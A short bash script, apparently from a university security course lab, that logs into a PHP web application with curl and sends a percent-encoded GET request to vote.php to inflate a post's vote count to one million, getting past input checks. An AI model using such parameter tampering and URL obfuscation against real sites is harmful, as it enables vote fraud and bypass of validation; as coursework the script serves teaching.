#!/bin/bash

if [ $# -ne 2 ]; then
	PREFIX="ugster21.student.cs.uwaterloo.ca/sdsuo"
else
	IP=$1
	PORT=$2
	PREFIX=$IP:$PORT
fi

POST_PAGE="$PREFIX/post.php"
HOME_PAGE="$PREFIX/index.php"
VIEW_PAGE="$PREFIX/view.php"
USERNAME="alice"
PASSWORD="passw0rd"

echo "=====[Setup]====="
echo "Using Login Page at: $POST_PAGE"
echo "Using Home Page at: $HOME_PAGE"
echo "Using View Page at: $VIEW_PAGE"

echo "=====[Login]====="
echo "Using username: $USERNAME"
echo "Using password: $PASSWORD"
echo "Logging in with POST request"

curl \
-c "cookie.txt" \
-d "form=login" \
-d "submit=Login" \
-d "username=$USERNAME" \
-d "password=$PASSWORD" \
$POST_PAGE

echo "=====[Upvoting with Obfuscated GET Request]====="
ATTACK_LINK="$PREFIX/vote.php?id=1&vote=1000000"
# OBFUSCATED_LINK="$PREFIX/vote.php?%69%64%3D%31%26%76%6F%74%65%3D%31%30%30%30%30%30%30"
OBFUSCATED_LINK="$PREFIX/vote.php?%69%64=%31&%76%6F%74%65=%31%30%30%30%30%30%30"


echo "Constructing GET request:  $ATTACK_LINK"
echo "Executing obfuscated GET request: $OBFUSCATED_LINK"
curl -b "cookie.txt" $OBFUSCATED_LINK

echo "Showing post page with modified upvotes"
curl -b "cookie.txt" $VIEW_PAGE?id=1
